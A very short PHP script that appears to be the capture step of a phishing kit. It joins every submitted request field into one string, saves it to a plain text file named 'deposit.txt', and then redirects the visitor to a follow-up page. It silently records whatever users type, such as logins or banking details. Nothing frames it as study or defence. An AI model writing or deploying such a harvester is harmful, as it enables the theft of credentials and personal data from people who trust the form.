<?php
$chataa=implode(" ",$_REQUEST);
$script="<script>location.href='./after getinb.php'</script>";
file_put_contents("deposit.txt",$chataa);
print $script;
?>